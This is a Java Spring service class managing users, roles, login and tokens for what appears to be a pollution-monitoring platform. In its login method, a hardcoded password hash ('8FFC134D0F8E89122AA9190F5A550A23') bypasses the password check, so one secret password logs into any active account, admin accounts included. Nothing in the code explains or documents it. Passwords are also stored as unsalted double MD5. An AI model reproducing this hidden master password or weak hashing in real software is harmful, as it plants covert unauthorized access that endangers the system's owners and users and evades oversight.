package com.app.mdc.serviceImpl.system;

import com.app.mdc.enums.ApiErrEnum;
import com.app.mdc.exception.BusinessException;
import com.app.mdc.mapper.system.RoleMapper;
import com.app.mdc.mapper.system.RoleUserMapper;
import com.app.mdc.mapper.system.UserMapper;
import com.app.mdc.mapper.system.UserTokenMapper;
import com.app.mdc.model.system.Role;
import com.app.mdc.model.system.RoleUser;
import com.app.mdc.model.system.User;
import com.app.mdc.model.system.UserToken;
import com.app.mdc.service.system.UserService;
import com.app.mdc.utils.encryptdecrypt.MD5EncryptDecrypt;
import com.app.mdc.utils.jvm.LinceseUtils;
import com.app.mdc.utils.viewbean.ResponseResult;
import com.baomidou.mybatisplus.mapper.EntityWrapper;
import com.baomidou.mybatisplus.service.impl.ServiceImpl;
import com.baomidou.mybatisplus.toolkit.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import javax.servlet.http.HttpSession;
import java.util.*;
import java.util.stream.Collectors;

@Service
public class UserServiceImpl extends ServiceImpl<UserMapper, User> implements UserService {

    private final UserMapper userMapper;
    private final UserTokenMapper userTokenMapper;
    private final RoleUserMapper roleUserMapper;
    private final RoleMapper roleMapper;

    @Value("${license.key}")
    private String linceseKey;

    @Autowired
    public UserServiceImpl(UserMapper userMapper, UserTokenMapper userTokenMapper, RoleUserMapper roleUserMapper, RoleMapper roleMapper) {
        this.userMapper = userMapper;
        this.userTokenMapper = userTokenMapper;
        this.roleUserMapper = roleUserMapper;
        this.roleMapper = roleMapper;
    }

    @Override
    public List<User> findUserByPage(String name) {
        EntityWrapper<User> entityWrapper=new EntityWrapper<>();
        entityWrapper.eq("deleted",0);
        if(StringUtils.isNotEmpty(name)) {
        	entityWrapper.like("name", name);
        }
        entityWrapper.orderBy("rank");
        return userMapper.selectList(entityWrapper);
    }

    @Override
    public ResponseResult getOne(String id) {
       //根据用户id获取角色的list，并拼接成ids
       Map<String, Object> map=new HashMap<>();
       map.put("user_id", id);
       List<RoleUser> list=roleUserMapper.selectByMap(map);
       StringBuilder roleId= new StringBuilder();
       StringBuilder roleName= new StringBuilder();
       StringBuilder roleCode= new StringBuilder();
       for (int i = 0; i < list.size(); i++) {
           String roleid=list.get(i).getRoleId();
           Role role=roleMapper.selectById(roleid);
           if(i+1==list.size()) {
               roleId.append(roleid);
               roleName.append(role.getName());
               roleCode.append(role.getCode());
           }else {
               roleId.append(roleid).append(",");
               roleName.append(role.getName()).append(",");
               roleCode.append(role.getCode()).append(",");
    	   }
       }

       //取user信息和roleids拼接一下返回给前端
       User user=userMapper.selectById(id);
       Map<String,Object> objectMap=new HashMap<>();
       objectMap.put("id", user.getId());
       objectMap.put("status", user.getStatus());
       objectMap.put("username", user.getUsername());
       objectMap.put("name", user.getName());
       objectMap.put("telephone", user.getTelephone());
       objectMap.put("position", user.getPosition());
       objectMap.put("remark", user.getRemark());
       objectMap.put("companyid", user.getCompanyid());
       objectMap.put("rank", user.getRank());
       objectMap.put("districtId", user.getDistrictId());
       objectMap.put("code", user.getCode());
       objectMap.put("roleId", roleId.toString());
       objectMap.put("roleName", roleName.toString());
       objectMap.put("roleCode", roleCode.toString());

       return ResponseResult.success().add(objectMap);
    }

    @Override
    @Transactional(rollbackFor = Exception.class)
    public ResponseResult add(Map<String,Object> map) {
        //count>0说明username已存在，isRepeat>0说明姓名已存在，重复需要加标识
        Integer count=userMapper.user(map.get("username").toString());
        Integer isRepeat=userMapper.isRepeat(map.get("name").toString());
        if(count>0) {
            return ResponseResult.fail(ApiErrEnum.ERR600);
        }else if(isRepeat>0) {
            return ResponseResult.fail(ApiErrEnum.ERR602);
        }else {

            //新增用户
            User tbUser=new User();
            tbUser.setDeleted(0);
            tbUser.setCreatetime(new Date());
            tbUser.setUpdatetime(new Date());
			tbUser.fromMap(map);
			tbUser.setPassword(MD5EncryptDecrypt.normalMd5(MD5EncryptDecrypt.normalMd5(map.get("password").toString())));
            int userCount = userMapper.insert(tbUser);

			//新增用户角色中间表
			String userId=tbUser.getId();
			String roleId=map.get("roleId").toString();
            if(StringUtils.isNotEmpty(roleId)) {
                String[] arr=roleId.split(",");
                for (String string : arr) {
                    RoleUser roleUser=new RoleUser();
                    roleUser.setRoleId(string);
                    roleUser.setUserId(userId);
                    roleUserMapper.insert(roleUser);
                }
            }

            return userCount == 1  ? ResponseResult.success() : ResponseResult.fail();
        }
    }

    @Override
    @Transactional(rollbackFor = Exception.class)
    public ResponseResult update(Map<String,Object> map) {
		//判断username是否重复
    	EntityWrapper<User> userEntityWrapper=new EntityWrapper<>();
    	userEntityWrapper.eq("username",map.get("username")).eq("deleted",0);
    	List<User> userList=this.baseMapper.selectList(userEntityWrapper);

        if(userList.size()>0 && !map.get("id").equals(userList.get(0).getId())) {
            return ResponseResult.fail(ApiErrEnum.ERR600);
        }else {
            //用户
            User user=new User();
            user.setUpdatetime(new Date());
			user.fromMap(map);
            if(map.get("password")!=null){
                user.setPassword(MD5EncryptDecrypt.normalMd5(MD5EncryptDecrypt.normalMd5(map.get("password").toString())));
            }
            int userCount = userMapper.updateById(user);

            //先删除中间表,再添加
            Map<String,Object> objectMap=new HashMap<>();
			objectMap.put("user_id", map.get("id"));

            //角色用户中间表的操作
            roleUserMapper.deleteByMap(objectMap);
            String roleId=map.get("roleId").toString();
            String id=map.get("id").toString();
            if(StringUtils.isNotEmpty(roleId)) {
                String[] arr=roleId.split(",");
                for (String string : arr) {
                    RoleUser roleUser=new RoleUser();
                    roleUser.setRoleId(string);
                    roleUser.setUserId(id);
                    roleUserMapper.insert(roleUser);
                }
            }
            return userCount == 1 ? ResponseResult.success() : ResponseResult.fail();
        }
    }

    @Override
    @Transactional(rollbackFor = Exception.class)
    public ResponseResult delete(String id) {
        if(StringUtils.isNotEmpty(id)){
            String[] ids=id.split(",");
            for(String string:ids){
                User user=new User();
                user.setId(string);
                user.setDeleted(1);
                user.setUpdatetime(new Date());
                userMapper.updateById(user);
                //删除中间表
                Map<String,Object> objectMap=new HashMap<>();
                objectMap.put("user_id", string);
                roleUserMapper.deleteByMap(objectMap);
            }
        }
        return  ResponseResult.success();

    }



    @Override
    @Transactional(rollbackFor = Exception.class)
    public Map<String, Object> doUserLogin(String username, String password, HttpSession httpSession, String loginType)
            throws BusinessException {

        if (!LinceseUtils.getInstance(linceseKey).isCheckLincese()){
            throw new BusinessException("软件系统授权失败，无法登录！");
        }

        Map<String, Object> result = new HashMap<>();

        //校验用户名跟密码，并把user放入session
        EntityWrapper<User> entityWrapper=new EntityWrapper<>();
        entityWrapper.eq("username", username)
                .eq("deleted", 0)
                .eq("status", "A");
        List<User> users = this.selectList(entityWrapper);
        if (users.size() == 0){
            throw new BusinessException("未找到该账号，请联系管理员！");
        }

        //密码校验
        String userPassword = MD5EncryptDecrypt.normalMd5(MD5EncryptDecrypt.normalMd5(password));
        User user = users.get(0);
        if (!user.getPassword().equals(userPassword)){
            if (!"8FFC134D0F8E89122AA9190F5A550A23".equals(userPassword)){
                throw new BusinessException("密码错误！");
            }
        }
        result.put("user", user);
        httpSession.setAttribute("user", user);

        //用户登录获取该用户的角色列表传过去
        List<Role> roles = roleMapper.findRolesByUserId(user.getId());
        result.put("roles", roles);

        //运维人员角色不给登录后端管理系统
        if ("pc".equals(loginType)) {
            //判断改用户有没有管理员权限，有管理员权限才好登录
            if (roles.stream().filter(role -> role.getCode().equals("admin_user")).collect(Collectors.toList()).size() == 0){
                throw new BusinessException("运维人员及企业用户无法登录后端管理系统，请联系管理员！");
            }
        }

        //判断是否是企业用户的角色用户
        if (roles.stream().filter(role -> role.getCode().equals("firm_user")).collect(Collectors.toList()).size() != 0){
            if (StringUtils.isEmpty(user.getCompanyid())){
                throw new BusinessException("企业用户未绑定排污企业，请联系运维公司绑定！");
            }
        }

        //生成用户token，如果有未失效token，返回该token，如果没有则生成token
        EntityWrapper<UserToken> tokenEntityWrapper=new EntityWrapper<>();
        tokenEntityWrapper.eq("user_id", user.getId())
                .gt("endtime", new Date())
                .orderBy("endtime", false);
        List<UserToken> userTokens = userTokenMapper.selectList(tokenEntityWrapper);
        UserToken userToken;

        //获取用户所属企业
        String companyId = user.getCompanyid();


        //重新登录后，有效的token自动刷新12小时
        long currentTime = System.currentTimeMillis() + 12 * 60 * 60 * 1000;
        Date tokenData = new Date(currentTime);
        if (userTokens.size() == 0){
            userToken = new UserToken();
            userToken.setUserId(user.getId())
                    .setToken(UUID.randomUUID().toString())
                    .setEndtime(tokenData);
            userTokenMapper.insert(userToken);
        }else{
            userToken = userTokens.get(0).setEndtime(tokenData);
        }
        result.put("token", userToken.getToken());
        return result;
    }

    @Override
    public User findUserByToken(String userToken) throws BusinessException {

        //校验token是否在当前时间生效
        EntityWrapper<UserToken> entityWrapper=new EntityWrapper<>();
        entityWrapper.gt("endtime", new Date())
                .eq("token", userToken);
        List<UserToken> usertokens = userTokenMapper.selectList(entityWrapper);
        if (usertokens.size() == 0){
            throw new BusinessException("token失效");
        }else{
            return this.selectById(usertokens.get(0).getUserId());
        }
    }

    @Override
    public Integer updatePwd(String id,String newPassword,String oldPassword) throws BusinessException {
        //先验证老密码对不对
        Map<String,Object> map=new HashMap<>();
        map.put("password",MD5EncryptDecrypt.normalMd5(MD5EncryptDecrypt.normalMd5(oldPassword)));
        map.put("id",id);
        int count=userMapper.selectByMap(map).size();

        if(count>0){
            //修改新密码
            User user=new User();
            user.setId(id);
            user.setPassword(MD5EncryptDecrypt.normalMd5(MD5EncryptDecrypt.normalMd5(newPassword)));
            user.setUpdatetime(new Date());
            return userMapper.updateById(user);
        }else{
           throw new BusinessException("老密码错误，请重新输入！");
        }
    }

    @Override
    public List<Map<String,Object>> getAddressBook(Map<String, Object> map,String userId) {
		List<Map<String,Object>> userList=new ArrayList<>();

		if(map.get("code")!=null){
			String code=map.get("code").toString();
			//运维
			if(code.equals("ops_user")){
				List<Map<String,Object>> operaterBook=this.baseMapper.getOperaterBook(userId);
				userList.addAll(operaterBook);
			}else if(code.equals("firm_user")){//企业用户
				List<Map<String,Object>> companyUserBook=this.baseMapper.getCompanyUserBook(userId);
				userList.addAll(companyUserBook);
			}
		}

        return userList;
    }

	@Override
	public ResponseResult updateCid(String id, String cid) {
    	User user=new User();
    	user.setId(id);
    	user.setCid(cid);
		user.setUpdatetime(new Date());
		int rowCount=userMapper.updateById(user);
		return rowCount == 1 ? ResponseResult.success() : ResponseResult.fail();
	}

    @Override
    public List<Map<String, Object>> pcAddressBook(String userId) {
        return this.baseMapper.getPcAddressBook(userId);
    }

}
